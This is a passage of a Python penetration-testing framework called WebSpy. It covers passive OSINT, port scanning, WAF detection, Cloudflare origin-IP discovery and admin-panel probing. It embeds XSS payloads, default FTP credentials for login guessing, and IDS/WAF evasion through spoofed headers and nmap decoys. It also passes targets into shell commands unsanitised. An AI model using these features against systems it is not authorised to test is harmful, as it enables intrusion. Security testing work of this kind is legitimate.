#!/usr/bin/env python3
"""
WebSpy — Advanced Penetration Testing Framework
Author  : Silentium Noctis
Version : 2.0
Use     : Authorized penetration testing & bug bounty only
"""

import os, sys, re, json, ssl, socket, argparse, ipaddress
import subprocess, shutil, requests
from time  import sleep, time
from datetime import datetime
from random import choice, uniform, randint
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin

requests.packages.urllib3.disable_warnings()

# ── Colors ────────────────────────────────────────────────────────────────────
R="\033[0;31m"; BR="\033[1;31m"; G="\033[0;32m"; BG="\033[1;32m"
Y="\033[0;33m"; BY="\033[1;33m"; C="\033[0;36m"; BC="\033[1;36m"
W="\033[1;37m"; NC="\033[0m"

VERSION = "2.1"
TOOL_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.join(TOOL_DIR, "payloads")

# ── Payload Loader ────────────────────────────────────────────────────────────
def load_payload_file(filepath):
    """Load payloads from a .txt file. Skips blank lines and # comments."""
    payloads = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.append(line)
        info(f"Loaded {len(payloads)} payloads from {os.path.basename(filepath)}")
    except FileNotFoundError:
        err(f"Payload file not found: {filepath}")
    except Exception as e:
        err(f"Error loading payload file: {e}")
    return payloads

def get_xss_payloads(custom_file=None):
    """Return XSS payloads — custom file > default file > hardcoded fallback."""
    if custom_file:
        p = load_payload_file(custom_file)
        if p: return p
    default = os.path.join(PAYLOAD_DIR, "xss.txt")
    if os.path.exists(default):
        p = load_payload_file(default)
        if p: return p
    return [
        '<script>alert(1)</script>', '"><script>alert(1)</script>',
        "'><script>alert(1)</script>", '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>', 'javascript:alert(1)', '{{7*7}}', '${7*7}',
    ]

def get_ftp_creds(custom_file=None):
    """Return FTP creds list — custom file > default file > hardcoded fallback."""
    if custom_file:
        raw = load_payload_file(custom_file)
        if raw:
            creds = []
            for line in raw:
                if ":" in line:
                    u, p = line.split(":", 1)
                    creds.append((u.strip(), p.strip()))
            return creds
    default = os.path.join(PAYLOAD_DIR, "ftp_creds.txt")
    if os.path.exists(default):
        raw = load_payload_file(default)
        creds = []
        for line in raw:
            if ":" in line:
                u, p = line.split(":", 1)
                creds.append((u.strip(), p.strip()))
        if creds: return creds
    return [
        ("anonymous","anonymous@"), ("anonymous",""), ("ftp","ftp"),
        ("admin","admin"), ("admin","password"), ("root","root"),
        ("root","toor"), ("test","test"), ("guest","guest"),
    ]

def get_csrf_paths(custom_file=None):
    """Return admin/CSRF paths — custom file > default file > hardcoded fallback."""
    if custom_file:
        p = load_payload_file(custom_file)
        if p: return p
    default = os.path.join(PAYLOAD_DIR, "csrf_paths.txt")
    if os.path.exists(default):
        p = load_payload_file(default)
        if p: return p
    return [
        "/admin", "/admin/", "/dashboard", "/panel", "/wp-admin",
        "/api/admin", "/api/users", "/user/profile", "/internal",
    ]

# ── Timing Profiles (like nmap -T) ───────────────────────────────────────────
TIMING = {
    1: {"name":"Stealth",    "delay":3.0,  "threads":2,  "nmap":"T1","desc":"Very slow — IDS/IPS evasion"},
    2: {"name":"Polite",     "delay":1.0,  "threads":5,  "nmap":"T2","desc":"Slow — low noise"},
    3: {"name":"Normal",     "delay":0.3,  "threads":15, "nmap":"T3","desc":"Balanced (default)"},
    4: {"name":"Aggressive", "delay":0.05, "threads":30, "nmap":"T4","desc":"Fast — more noise"},
    5: {"name":"Insane",     "delay":0.0,  "threads":60, "nmap":"T5","desc":"Maximum speed"},
}

# ── User Agents (evasion rotation) ───────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/7.88.1",
]

CF_RANGES = [
    "103.21.244.0/22","103.22.200.0/22","103.31.4.0/22","104.16.0.0/13",
    "104.24.0.0/14","108.162.192.0/18","131.0.72.0/22","141.101.64.0/18",
    "162.158.0.0/15","172.64.0.0/13","173.245.48.0/20","188.114.96.0/20",
    "190.93.240.0/20","197.234.240.0/22","198.41.128.0/17",
]

results_store = []

# ── Output Helpers ────────────────────────────────────────────────────────────
def info(m):   print(f"{C}[*]{NC} {m}")
def ok(m):     print(f"{G}[+]{NC} {m}"); results_store.append(f"[+] {m}")
def warn(m):   print(f"{Y}[!]{NC} {m}"); results_store.append(f"[!] {m}")
def err(m):    print(f"{R}[-]{NC} {m}")
def found(m):  print(f"{BG}[FOUND]{NC} {W}{m}{NC}"); results_store.append(f"[FOUND] {m}")
def crit(m):   print(f"{BR}[CRITICAL]{NC} {BR}{m}{NC}"); results_store.append(f"[CRITICAL] {m}")
def head(t):   print(f"\n{W}{'─'*60}{NC}\n{BY} {t}{NC}\n{W}{'─'*60}{NC}")
def step(t):   print(f"\n{C}[→]{NC} {W}{t}{NC}")

def get_ua(evasion=False):
    if evasion:
        return choice(USER_AGENTS)
    return USER_AGENTS[0]

def timed_delay(t_level=3, evasion=False):
    d = TIMING[t_level]["delay"]
    if evasion and d > 0:
        sleep(uniform(d * 0.5, d * 1.5))
    elif d > 0:
        sleep(d)

def threads(t_level=3):
    return TIMING[t_level]["threads"]

def nmap_timing(t_level=3):
    return TIMING[t_level]["nmap"]

# ── Banner ────────────────────────────────────────────────────────────────────
def banner():
    print(f"""{C}
 ██╗    ██╗███████╗██████╗ ███████╗██████╗ ██╗   ██╗
 ██║    ██║██╔════╝██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝
 ██║ █╗ ██║█████╗  ██████╔╝███████╗██████╔╝ ╚████╔╝
 ██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔═══╝   ╚██╔╝
 ╚███╔███╔╝███████╗██████╔╝███████║██║        ██║
  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚═╝        ╚═╝
{NC}{BY} Advanced Penetration Testing Framework  v{VERSION}{NC}
{BG}                    Created by Silentium Noctis{NC}
{R} [!] For authorized penetration testing and bug bounty only{NC}
""")

# ── Help ──────────────────────────────────────────────────────────────────────
def show_help():
    banner()
    print(f"""{W}USAGE:{NC}
  python3 webspy.py [flags] -t <target>
  python3 webspy.py                      {C}← interactive mode{NC}

{W}TARGET:{NC}
  {G}-t, --target <domain/IP>{NC}   Target domain or IP address

{W}SCAN MODES:{NC}
  {G}-m passive{NC}                 Passive OSINT only  (no direct contact with target)
  {G}-m active{NC}                  Active scanning     (direct connection to target)
  {G}-m bypass{NC}                  CF/WAF bypass mode  (origin IP discovery)
  {G}-m full{NC}                    Full scan           (all modules, recommended)

{W}MODULES (combine freely):{NC}
  {G}--sub{NC}                      Subdomain enumeration    (sublist3r + gobuster dns)
  {G}--dir{NC}                      Directory & file busting (gobuster dir + common paths)
  {G}--tcp{NC}                      TCP port scan            (nmap -sV -sC)
  {G}--udp{NC}                      UDP port scan            (nmap -sU, needs sudo)
  {G}--ping{NC}                     Host up/down check       (ICMP + TCP ping)
  {G}--cf{NC}                       Cloudflare bypass        (4 methods, origin discovery)
  {G}--s3{NC}                       S3 bucket discovery      (30+ naming patterns)
  {G}--headers{NC}                  Security headers audit   (HSTS, CSP, X-Frame etc.)
  {G}--waf{NC}                      WAF fingerprinting       (wafw00f)
  {G}--tech{NC}                     Web tech detection       (whatweb + headers)
  {G}--js{NC}                       JavaScript analysis      (endpoints, keys, secrets)
  {G}--php{NC}                      PHP surface scan         (version, info pages, wrappers)
  {G}--nikto{NC}                    Nikto web server scan    (CVEs, misconfigs)
  {G}--whois{NC}                    WHOIS + ASN lookup
  {G}--ftp{NC}                      FTP anonymous/default credential check
  {G}--ssh{NC}                      SSH banner grab + auth-method audit
  {G}--sensitive{NC}                Sensitive file/path leak (env, git, backups, keys)
  {G}--cookie{NC}                   Cookie & session security analysis
  {G}--xss{NC}                      Reflected XSS + DOM sinks + SSTI detection
  {G}--csrf{NC}                     CSRF token check + Broken Access Control + IDOR
  {G}--api{NC}                      API endpoint discovery + CORS + GraphQL introspection

{W}CONTROL:{NC}
  {G}-T <1-5>{NC}                   Timing / threat control:
                             1 = Stealth    (3s delay,  2  threads) — IDS evasion
                             2 = Polite     (1s delay,  5  threads)
                             3 = Normal     (0.3s,      15 threads) ← default
                             4 = Aggressive (0.05s,     30 threads)
                             5 = Insane     (no delay,  60 threads)
  {G}-e, --evasion{NC}              Enable evasion:
                             • User-Agent rotation
                             • Random timing jitter
                             • Cloudflare evasion headers
                             • nmap fragmentation (-f) + decoy (-D RND:5)
  {G}-D, --depth <1-5>{NC}          Crawl depth level (default: 2)
  {G}-p, --ports <ports>{NC}        Custom ports  e.g. -p 80,443,8080  or -p 1-1000
  {G}--proxy <host:port>{NC}        Route through proxy e.g. --proxy 127.0.0.1:8080
  {G}--tor{NC}                      Route through Tor   (requires tor service running)

{W}OUTPUT:{NC}
  {G}-o, --output <file>{NC}        Save results  (.txt auto-detected)
  {G}-j, --json <file>{NC}          Save full JSON report
  {G}-v, --verbose{NC}              Show raw tool output
  {G}-q, --quiet{NC}                Show only findings (no info lines)

{W}INFO:{NC}
  {G}-h, --help{NC}                 Show this help
  {G}-V, --version{NC}              Show version

{W}TIMING PROFILES:{NC}
  {C}-T1{NC}  Stealth    — 3s delay,  2  threads,  nmap T1,  IDS/IPS evasion
  {C}-T2{NC}  Polite     — 1s delay,  5  threads,  nmap T2
  {C}-T3{NC}  Normal     — 0.3s,      15 threads,  nmap T3  (default)
  {C}-T4{NC}  Aggressive — 0.05s,     30 threads,  nmap T4
  {C}-T5{NC}  Insane     — no delay,  60 threads,  nmap T5

{W}EVASION TECHNIQUES:{NC}
  • User-Agent rotation        (search engine bots, browsers)
  • Randomized request timing  (jitter ±50%% of base delay)
  • Cloudflare bypass headers  (X-Forwarded-For, X-Real-IP spoofing)
  • nmap --data-length + -f    (packet fragmentation)
  • nmap -D RND:5              (decoy IP scanning)
  • URL encoding variations    (WAF payload bypass)
  • HTTP/HTTPS alternation

{W}EXAMPLES:{NC}
  {Y}# Interactive mode (tool will ask everything){NC}
  python3 webspy.py

  {Y}# Passive recon only (OSINT, no direct contact){NC}
  python3 webspy.py -t example.com -m passive

  {Y}# Full scan with evasion, stealth timing{NC}
  python3 webspy.py -t example.com -m full -T1 -e

  {Y}# Cloudflare bypass + origin IP discovery{NC}
  python3 webspy.py -t example.com --cf -T3

  {Y}# Subdomain + directory busting, aggressive{NC}
  python3 webspy.py -t example.com --sub --dir -T4

  {Y}# TCP port scan on custom ports{NC}
  python3 webspy.py -t example.com --tcp -p 1-10000 -T3

  {Y}# JS analysis + PHP surface + headers audit{NC}
  python3 webspy.py -t example.com --js --php --headers

  {Y}# Full scan, save report, through Burp proxy{NC}
  python3 webspy.py -t example.com -m full --proxy 127.0.0.1:8080 -o report.txt -j report.json

  {Y}# UDP scan (needs sudo){NC}
  sudo python3 webspy.py -t example.com --udp -T2

  {Y}# Bug bounty quick workflow{NC}
  python3 webspy.py -t example.com --sub --cf --s3 --js --headers -T4 -o bb_report.txt

  {Y}# Security audit — vuln modules{NC}
  python3 webspy.py -t example.com --sensitive --cookie --xss --csrf --api -T3

  {Y}# FTP + SSH service check on IP{NC}
  python3 webspy.py -t 192.168.1.1 --ftp --ssh -T3

{W}POST-SCAN COMMANDS:{NC}
  {Y}# Origin IP found — bypass Cloudflare WAF:{NC}
  curl -sk -H 'Host: target.com' https://<origin_ip>/ | head -80

  {Y}# Port scan on discovered origin:{NC}
  nmap -sV -sC --open -p- <origin_ip> -T4

  {Y}# S3 public bucket:{NC}
  aws s3 ls s3://<bucket> --no-sign-request
  aws s3 sync s3://<bucket> ./loot --no-sign-request

  {Y}# Gobuster with found origin:{NC}
  gobuster dir -u https://<origin_ip> -H 'Host: target.com' -w /usr/share/wordlists/dirb/big.txt -k

{W}NOTES:{NC}
  — Passive mode: zero direct requests to target
  — UDP scan requires root (sudo)
  — Evasion + T1 = maximum stealth
  — JS analysis downloads and reads .js files from target
  — All Kali tools run in background, only useful results shown
  — Output filtered: no raw dumps, only actionable findings

{W}AUTHOR:{NC}  {G}Silentium Noctis{NC}
{W}VERSION:{NC} {C}{VERSION}{NC}
""")

# ── Utilities ─────────────────────────────────────────────────────────────────

def is_cf_ip(ip):
    try:
        addr = ipaddress.ip_address(ip)
        return any(addr in ipaddress.ip_network(r) for r in CF_RANGES)
    except Exception:
        return False

def resolve(domain):
    try:
        return socket.gethostbyname(domain)
    except Exception:
        return None

def req(url, evasion=False, proxy=None, timeout=8, **kwargs):
    headers = kwargs.pop("headers", {})
    headers.setdefault("User-Agent", get_ua(evasion))
    if evasion:
        headers.update({
            "X-Forwarded-For": f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}",
            "X-Real-IP":       f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}",
            "X-Originating-IP": f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}",
        })
    proxies = None
    if proxy:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        return requests.get(url, headers=headers, proxies=proxies,
                            timeout=timeout, verify=False,
                            allow_redirects=True, **kwargs)
    except Exception:
        return None

def run_tool(cmd, label="", verbose=False, timeout=120):
    """Run a Kali tool, capture output, return lines."""
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        lines = proc.stdout.strip().split("\n") + proc.stderr.strip().split("\n")
        lines = [l.strip() for l in lines if l.strip()]
        if verbose:
            for l in lines:
                print(f"  {C}│{NC} {l}")
        return lines
    except subprocess.TimeoutExpired:
        warn(f"{label} timed out after {timeout}s")
        return []
    except Exception as e:
        err(f"{label} error: {e}")
        return []

def tool_ok(name):
    return shutil.which(name) is not None

# ── Module: Passive Recon ─────────────────────────────────────────────────────

def passive_recon(domain, verbose=False):
    head("PASSIVE RECON  (no direct contact with target)")
    findings = {}

    # WHOIS
    step("WHOIS lookup")
    lines = run_tool(f"whois {domain} 2>/dev/null", "whois", verbose)
    useful = [l for l in lines if any(k in l.lower() for k in
              ["registrar","registered","expir","name server","dnssec","org","country","email"])]
    for l in useful[:12]:
        ok(f"WHOIS | {l.strip()}")
    findings["whois"] = useful[:12]

    # DNS Records
    step("DNS records (A, MX, TXT, NS, CNAME)")
    for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]:
        out = run_tool(f"dig +short {rtype} {domain}", f"dig {rtype}", verbose)
        for l in out:
            if l and not l.startswith(";"):
                ok(f"DNS {rtype} | {l}")
    findings["dns"] = out

    # Historical DNS via HackerTarget
    step("Historical DNS (HackerTarget API)")
    try:
        r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
        if r.status_code == 200 and "error" not in r.text[:30].lower():
            for line in r.text.strip().split("\n")[:15]:
                ok(f"DNS History | {line}")
            findings["dns_history"] = r.text.strip().split("\n")[:15]
    except Exception:
        pass

    # Certificate Transparency
    step("Certificate Transparency (crt.sh)")
    try:
        r = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=12)
        if r.status_code == 200:
            data = r.json()
            subs = sorted(set(
                d["name_value"].replace("*.", "")
                for d in data
                if "name_value" in d
            ))
            for s in subs[:20]:
                ok(f"CRT.SH | {s}")
            findings["crt_sh"] = subs[:30]
            info(f"Total subdomains from CT logs: {len(subs)}")
    except Exception:
        pass

    # ASN / IP info
    step("ASN & IP info")
    ip = resolve(domain)
    if ip:
        try:
            r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=8)
            if r.status_code == 200:
                d = r.json()
                for key in ["ip","org","country","region","city","hostname"]:
                    if d.get(key):
                        ok(f"IPInfo | {key}: {d[key]}")
                findings["ipinfo"] = d
        except Exception:
            pass

    return findings

# ── Module: Host Check ────────────────────────────────────────────────────────

def host_check(target, verbose=False):
    head("HOST CHECK")
    up = False

    # ICMP ping
    step("ICMP ping")
    out = run_tool(f"ping -c 3 -W 2 {target} 2>/dev/null", "ping", verbose)
    for l in out:
        if "bytes from" in l or "time=" in l:
            ok(f"Host UP (ICMP) | {l.strip()}")
            up = True
        if "100% packet loss" in l:
            warn("ICMP blocked (host may still be up)")

    # TCP ping on common ports
    step("TCP ping (80, 443, 22, 8080)")
    for port in [80, 443, 22, 8080, 8443]:
        try:
            s = socket.socket()
            s.settimeout(2)
            result = s.connect_ex((target, port))
            s.close()
            if result == 0:
                ok(f"Host UP | TCP port {port} open")
                up = True
        except Exception:
            pass

    if not up:
        warn(f"Host {target} appears DOWN or heavily filtered")
    return up

# ── Module: Port Scan ─────────────────────────────────────────────────────────

def port_scan(target, ports="top1000", proto="tcp", t_level=3,
              evasion=False, verbose=False):
    head(f"PORT SCAN  ({proto.upper()})")

    if not tool_ok("nmap"):
        err("nmap not found"); return {}

    nmap_t  = nmap_timing(t_level)
    port_arg = f"-p {ports}" if ports != "top1000" else "--top-ports 1000"
    evasion_flags = "-f --data-length 24 -D RND:5" if evasion else ""

    if proto == "tcp":
        cmd = f"nmap -{nmap_t} -sV -sC --open {port_arg} {evasion_flags} {target} 2>/dev/null"
    else:
        cmd = f"sudo nmap -{nmap_t} -sU --open {port_arg} {evasion_flags} {target} 2>/dev/null"

    step(f"Running: {cmd}")
    lines = run_tool(cmd, "nmap", verbose, timeout=300)

    open_ports = []
    for l in lines:
        if "/tcp" in l or "/udp" in l:
            if "open" in l and "filtered" not in l:
                ok(f"PORT | {l.strip()}")
                open_ports.append(l.strip())
        if "OS details" in l or "Service Info" in l or "script output" in l.lower():
            info(f"NMAP | {l.strip()}")

    if not open_ports:
        warn("No open ports found (try different port range or -T4)")

    return {"open_ports": open_ports}

# ── Module: WAF Detection ─────────────────────────────────────────────────────

def waf_detect(domain, verbose=False):
    head("WAF DETECTION")
    if not tool_ok("wafw00f"):
        err("wafw00f not found"); return []

    lines = run_tool(f"wafw00f https://{domain} 2>/dev/null", "wafw00f", verbose)
    detected = []
    for l in lines:
        if "is behind" in l.lower() or "detected" in l.lower():
            ok(f"WAF | {l.strip()}")
            detected.append(l.strip())
        if "no waf" in l.lower():
            info("No WAF detected")
    return detected

# ── Module: Web Tech Detection ────────────────────────────────────────────────

def tech_detect(domain, verbose=False):
    head("WEB TECHNOLOGY DETECTION")
    if not tool_ok("whatweb"):
        err("whatweb not found"); return {}

    lines = run_tool(f"whatweb -a 3 https://{domain} 2>/dev/null", "whatweb", verbose)
    for l in lines:
        if domain in l or "http" in l.lower():
            # Clean and show only tech info
            clean = re.sub(r'\033\[[0-9;]*m', '', l)
            ok(f"TECH | {clean[:120]}")
    return {"whatweb": lines}

# ── Module: Cloudflare Bypass ─────────────────────────────────────────────────

def cf_bypass(domain, evasion=False, proxy=None, verbose=False):
    head("CLOUDFLARE / WAF BYPASS  —  Origin IP Discovery")
    origins = []
    ua = get_ua(evasion)

    # Detect CF
    ip = resolve(domain)
    if ip:
        info(f"Current IP: {ip}")
        if is_cf_ip(ip):
            warn("Cloudflare IP confirmed — searching for origin...")
        else:
            ok(f"Direct IP (no Cloudflare): {ip}")
            origins.append({"ip": ip, "method": "Direct"})

    # Method 1: Historical DNS
    step("[1/5] Historical DNS (HackerTarget)")
    try:
        r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
        for l in r.text.strip().split("\n"):
            ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', l)
            for h_ip in ips:
                if not is_cf_ip(h_ip):
                    found(f"[Historical DNS] {h_ip}")
                    origins.append({"ip": h_ip, "method": "Historical DNS"})
    except Exception:
        pass

    # Method 2: Subdomain bypass
    step("[2/5] Subdomain bypass scan")
    bypass_subs = [
        "direct","origin","real","backend","server","host","vps",
        "api","api2","rest","app","www2","old","legacy",
        "mail","smtp","mx","webmail","cpanel","whm","plesk","ftp",
        "staging","stage","dev","development","test","beta","qa",
        "admin","portal","dashboard","manage","panel",
        "static","assets","cdn","media","files","upload",
        "ns1","ns2","vpn","remote","ssh","autodiscover",
    ]

    def check_sub(sub):
        h = f"{sub}.{domain}"
        try:
            old_to = socket.getdefaulttimeout()
            socket.setdefaulttimeout(3)
            resolved_ip = socket.gethostbyname(h)
            socket.setdefaulttimeout(old_to)
            if resolved_ip and not is_cf_ip(resolved_ip):
                return {"subdomain": h, "ip": resolved_ip, "method": "Subdomain Bypass"}
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = [ex.submit(check_sub, s) for s in bypass_subs]
        for f in as_completed(futs):
            r = f.result()
            if r:
                found(f"[Subdomain] {r['subdomain']} → {r['ip']}")
                origins.append(r)

    # Method 3: MX + SPF records
    step("[3/5] MX / SPF record origin")
    for rtype, regex in [("MX", r'\d+\.\d+\.\d+\.\d+'), ("TXT", r'ip4:(\d+\.\d+\.\d+\.\d+)')]:
        out = run_tool(f"dig +short {rtype} {domain}", f"dig {rtype}", False)
        for l in out:
            ips = re.findall(regex, l)
            for mip in ips:
                if mip and not is_cf_ip(mip):
                    found(f"[{rtype} Record] {mip}")
                    origins.append({"ip": mip, "method": f"{rtype} Record"})

    # Method 4: SSL SAN + Favicon hash
    step("[4/5] SSL certificate SAN")
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((domain, 443), timeout=6) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
        san = [v for t, v in cert.get("subjectAltName", []) if t == "DNS"]
        if san:
            ok(f"SSL SAN domains: {', '.join(san[:8])}")
            info(f"Shodan query: ssl.cert.subject.cn:{domain}")
    except Exception:
        pass

    import base64, hashlib
    try:
        r = req(f"https://{domain}/favicon.ico", evasion=evasion, proxy=proxy, timeout=5)
        if r and r.status_code == 200:
            b64 = base64.encodebytes(r.content)
            fhash = hashlib.md5(b64).hexdigest()
            ok(f"Favicon MD5: {fhash}")
            info(f"Shodan query: http.favicon.hash:{fhash}")
    except Exception:
        pass

    # Method 5: Direct header bypass test
    step("[5/5] Header injection bypass test")
    bypass_headers_list = [
        {"CF-Connecting-IP": "127.0.0.1"},
        {"X-Forwarded-For":  "127.0.0.1"},
        {"X-Real-IP":        "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"True-Client-IP":   "127.0.0.1"},
    ]
    for hdr in bypass_headers_list:
        r = req(f"https://{domain}", evasion=evasion, proxy=proxy, headers=hdr, timeout=6)
        if r and r.status_code not in [403, 406, 429, 503]:
            h_name = list(hdr.keys())[0]
            ok(f"Bypass header accepted: {h_name} → HTTP {r.status_code}")

    # Deduplicate
    seen = set()
    unique = []
    for o in origins:
        key = o.get("ip","") or o.get("subdomain","")
        if key not in seen:
            seen.add(key)
            unique.append(o)

    if unique:
        head("ORIGIN IPs FOUND — Browser Verification")
        # Show all found origins
        for o in unique:
            ok(f"ORIGIN | {o.get('method','?')} → {o.get('subdomain', o.get('ip','?'))} [{o.get('ip','')}]")
        # Deep verify top 3 unique IPs only (speed)
        checked = set()
        for o in unique:
            ip = o.get("ip","")
            if ip and ip not in checked:
                verify_ip_ports(domain, ip)
                checked.add(ip)
            if len(checked) >= 3:
                info(f"Remaining {len(unique)-3} IPs — run --cf on specific subdomain to check more")
                break
    else:
        warn("Origin IP not found automatically")
        info(f"Manual: https://securitytrails.com/domain/{domain}/history/a")
        info(f"Manual: https://censys.io/search?q={domain}")

    return unique


def verify_ip_ports(domain, ip):
    """
    Check every common port on the IP.
    Verify which IP:port is directly browser-accessible
    and which admin panels (cPanel/WHM) are exposed.
    """
    PANEL_PORTS = {
        2082: ("HTTP",  "cPanel Login (HTTP)"),
        2083: ("HTTPS", "cPanel Login (HTTPS)"),
        2086: ("HTTP",  "WHM Login (HTTP)"),
        2087: ("HTTPS", "WHM Login (HTTPS)"),
        10000:("HTTP",  "Webmin"),
        8888: ("HTTP",  "Jupyter / Alt panel"),
    }
    WEB_PORTS = [80, 443, 8080, 8443, 8000]

    print(f"\n  {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
    print(f"  {W}IP: {BC}{ip}{NC}")
    print(f"  {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
    print(f"  {W}{'PORT':<7} {'PROTO':<7} {'DIRECT (browser)':<26} {'HOST HEADER':<24} {'STATUS'}{NC}")
    print(f"  {'─'*80}")

    browser_accessible = []
    admin_panels       = []

    def probe(url, host_hdr=None):
        hdrs = {"User-Agent": USER_AGENTS[0]}
        if host_hdr:
            hdrs["Host"] = host_hdr
        try:
            r = requests.get(url, timeout=3, verify=False,
                             allow_redirects=True, headers=hdrs)
            title = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I|re.S)
            title = title.group(1).strip()[:30] if title else ""
            return r.status_code, len(r.content), title
        except Exception:
            return 0, 0, ""

    # ── Web ports ──────────────────────────────────────────────────────────
    for port in WEB_PORTS:
        scheme = "https" if port in [443, 8443] else "http"
        url    = f"{scheme}://{ip}:{port}/"

        d_code, d_size, d_title = probe(url)
        h_code, h_size, h_title = probe(url, host_hdr=domain)

        if d_code == 0 and h_code == 0:
            continue

        dc = G if d_code==200 else (Y if d_code in [301,302] else (Y if d_code==403 else R))
        hc = G if h_code==200 else (Y if h_code in [301,302] else (Y if h_code==403 else R))

        d_str = f"{dc}{d_code}{NC}({d_size}b)" if d_code else f"{R}closed{NC}"
        h_str = f"{hc}{h_code}{NC}({h_size}b)" if h_code else f"{R}----{NC}"

        status_note = ""
        if d_code == 200 and d_size > 500:
            status_note = f"{G}BROWSER OK{NC} — {d_title}"
            browser_accessible.append({
                "url": url, "port": port, "scheme": scheme,
                "title": d_title, "type": "website"
            })
        elif h_code == 200 and d_code in [403, 0, 301, 302]:
            status_note = f"{Y}Virtual hosting{NC} (needs Host header)"
        elif d_code in [301, 302]:
            status_note = f"{Y}Redirect{NC}"

        print(f"  {port:<7} {scheme.upper():<7} {d_str:<34} {h_str:<32} {status_note}")

    # ── Admin panel ports ──────────────────────────────────────────────────
    print(f"\n  {W}{'PORT':<7} {'PROTO':<7} {'VERIFIED URL':<45} {'TITLE':<30} {'PANEL'}{NC}")
    print(f"  {'─'*80}")

    for port, (default_scheme, label) in PANEL_PORTS.items():
        scheme = default_scheme.lower()
        url    = f"{scheme}://{ip}:{port}/"

        code, size, title = probe(url)

        if code == 0:
            print(f"  {port:<7} {scheme.upper():<7} {R}closed{NC}")
            continue

        color = G if code == 200 else (Y if code in [301,302] else R)
        verified_url = f"{scheme}://{ip}:{port}/"

        if code in [200, 301, 302]:
            print(f"  {port:<7} {scheme.upper():<7} {G}{verified_url:<45}{NC} {C}{title:<30}{NC} {BY}{label}{NC}")
            admin_panels.append({
                "url":    verified_url,
                "port":   port,
                "scheme": scheme,
                "title":  title,
                "label":  label,
                "status": code,
            })
            results_store.append(f"[PANEL] {label}: {verified_url}")
        else:
            print(f"  {port:<7} {scheme.upper():<7} {color}{code}{NC}  {verified_url}")

    # ── Final verified summary ─────────────────────────────────────────────
    print()

    if admin_panels or browser_accessible:
        print(f"\n  {BG}{'═'*60}{NC}")
        print(f"  {BG} VERIFIED BROWSER-ACCESSIBLE URLs for {ip}{NC}")
        print(f"  {BG}{'═'*60}{NC}\n")

        if browser_accessible:
            print(f"  {W}[ Website Direct Access ]{NC}")
            for b in browser_accessible:
                print(f"  {G}→ {b['url']}{NC}")
                if b.get("title"):
                    print(f"    Title : {b['title']}")
            print()

        if admin_panels:
            print(f"  {W}[ Admin Panels — Open in browser now ]{NC}")
            for p in admin_panels:
                status_tag = f"{G}[LIVE]{NC}" if p["status"]==200 else f"{Y}[REDIRECT]{NC}"
                print(f"  {status_tag} {BY}{p['url']}{NC}  ← {p['label']}")
                if p.get("title"):
                    print(f"         Title  : {p['title']}")
            print()

        # /etc/hosts tip for virtual-hosted site
        if not browser_accessible:
            print(f"  {W}[ Site Access via IP (Virtual Hosting fix) ]{NC}")
            print(f"  {C}Add to /etc/hosts then browse normally:{NC}")
            print(f"  {G}  echo '{ip} {domain}' | sudo tee -a /etc/hosts{NC}")
            print(f"  {G}  # Then open: https://{domain}{NC}")
            print(f"  {C}Windows:{NC} C:\\Windows\\System32\\drivers\\etc\\hosts")
            print(f"  {G}  {ip}  {domain}{NC}\n")
    else:
        warn(f"{ip} — all ports closed or filtered")

    return {"browser": browser_accessible, "panels": admin_panels}

# ── Module: Subdomain Enumeration ─────────────────────────────────────────────

def subdomain_enum(domain, depth=2, t_level=3, verbose=False):
    head("SUBDOMAIN ENUMERATION")
    subs = set()

    # Sublist3r
    if tool_ok("sublist3r"):
        step("Sublist3r")
        lines = run_tool(f"sublist3r -d {domain} -t {threads(t_level)} 2>/dev/null",
                        "sublist3r", verbose, timeout=120)
        for l in lines:
            if domain in l and not l.startswith("[") and not l.startswith("http"):
                clean = re.sub(r'\033\[[0-9;]*m', '', l).strip()
                if clean:
                    ok(f"SUB | {clean}")
                    subs.add(clean)

    # Gobuster DNS
    if tool_ok("gobuster"):
        wl = "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
